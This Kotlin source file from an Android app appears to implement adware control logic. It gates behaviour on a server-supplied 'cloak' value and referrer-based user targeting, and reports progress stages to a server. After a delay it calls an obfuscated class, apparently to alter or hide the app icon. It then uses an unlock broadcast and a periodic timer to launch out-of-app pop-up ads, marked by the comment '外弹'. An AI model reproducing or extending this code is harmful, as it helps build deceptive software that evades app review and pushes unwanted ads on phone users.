package com.fast.sixth.man.core

import android.os.Build
import com.JCSiSi.IFiCBnkuxQ.TJqwEFbY
import com.fast.sixth.man.listener.LifecycleActivityListener
import com.fast.sixth.man.open.FancyUser
import com.fast.sixth.man.open.bro.FancyBroadcastReceiver
import com.fast.sixth.man.open.bro.isCanBroadEvent
import com.fast.sixth.man.open.bro.mIntentFilter
import com.fast.sixth.man.other.ActivityLifeHelper
import com.fast.sixth.man.other.FancyAdFetch
import com.fast.sixth.man.other.info.FancySceneryConfigure
import com.fast.sixth.man.other.info.FancySceneryNetwork
import com.fast.sixth.man.other.info.SpFancy
import com.fast.sixth.man.other.info.mCloakInfo
import com.fast.sixth.man.tools.AppInfoTools
import com.fast.sixth.man.tools.FIntImpl
import com.fast.sixth.man.tools.FancyLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Date：2024/1/19
 * Describe:
 */

private var curProgress by FIntImpl(0, tag = "Progress")
private var fancyFailedNum by FIntImpl(0)

object FancySceneryHelper {
    private var retryNum = fancyFailedNum
        set(value) {
            field = value
            fancyFailedNum = value
        }

    //都通过
    fun isProgressAllGo(): Boolean {
        if (curProgress == 100) return true
        return isProgress2Allow() && mCloakInfo == 10
    }

    fun isProgress2Allow(): Boolean {
        return FancyUser.isTargetUser() || SpFancy.isAdJUser()
    }

    private var mJob: Job? = null
    fun startCheck() {
        mJob?.cancel()
        mJob = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            val startTime = System.currentTimeMillis()
            while (true) {
                FancyLog.e("curProgress--->$curProgress")
                when (curProgress) {
                    0 -> {
                        if (FancySceneryConfigure.fancyCBean.isOpenS()) {
                            curProgress = 2
                            FancySceneryNetwork.postMai("issimer", isPost = true, retry = 18)
                            continue
                        }
                    }

                    "2".toInt() -> {
                        if (isProgress2Allow()) {
                            curProgress = 3
                            FancySceneryNetwork.postMai(
                                "isuser",
                                isPost = true,
                                retry = 8,
                                map = mapOf("getstring" to FancyUser.referrerTag)
                            )
                            continue
                        }
                    }

                    "3".toInt() -> {
                        if (mCloakInfo == 10) {
                            curProgress = 100
                            FancySceneryNetwork.postMai("ishit", isPost = true, retry = 12)
                            break
                        } else if (mCloakInfo == 5) {
                            FancyLog.e("mCloakInfo not allow")
                            mJob?.cancel()
                        }
                    }

                    else -> {
                        break
                    }
                }
                delay(2000)
            }
            withContext(Dispatchers.Main) {
                iconWait(startTime)
                if (System.currentTimeMillis() - startTime < 2000) {
                    delay(1200)
                }
                FancyLog.e("--->>>> change")
                TJqwEFbY.cnVHMqua(mApp, 0)
                registerTime()
            }
        }
    }

    private suspend fun iconWait(time: Long) {
        if (Build.VERSION.SDK_INT < 29) {
            return
        }
        while (true) {
            if (LifecycleActivityListener.isInBoot.not() && FancySceneryConfigure.fancyCBean.isIAllow()) {
                break
            }
            delay(4000)
        }
    }

    private var timeJob: Job? = null
    private fun registerTime() {
        mApp.registerReceiver(FancyBroadcastReceiver(), mIntentFilter)
        timeJob?.cancel()
        timeJob = CoroutineScope(Dispatchers.Main).launch {
            delay(4000)
            while (true) {
                FancySceneryNetwork.postMai("time")
                fancyE()
                delay(FancySceneryConfigure.checkPeriodTime)
            }
        }
    }

    private fun isLimitP(): Boolean {
        if (retryNum > 195) {
            timeJob?.cancel()
            isCanBroadEvent = false
            FancySceneryNetwork.postMai("jumpfail")
            return true
        }
        return false
    }

    fun fancyE() {
        if (isLimitP()) return
        if (AppInfoTools.isPhoneClose()) return
        FancySceneryNetwork.postMai("isunlock")
        if (ActivityLifeHelper.isAppRCheckAllow()) {
            if (FancySceneryConfigure.isFancyBeanAllow().not()) return
        } else {
            return
        }
        if (isFancyReady()) {
            CoroutineScope(Dispatchers.Main).launch {
                //外弹
                //todo modify
                TJqwEFbY.cnVHMqua(mApp, 10086)
//            TJqwEFbY.dc(mApp, 2)
            }
        }
    }

    private fun isFancyReady(): Boolean {
        if (FancyAdFetch.isReadyAd()) {
            isNeedNow = false
            FancySceneryNetwork.postMai("isready")
            return true
        } else {
            FancyAdFetch.load()
            isNeedNow = true
            return false
        }
    }

    private var isNeedNow = false

    fun eventNow() {
        if (isNeedNow) {
            fancyE()
        }
    }

}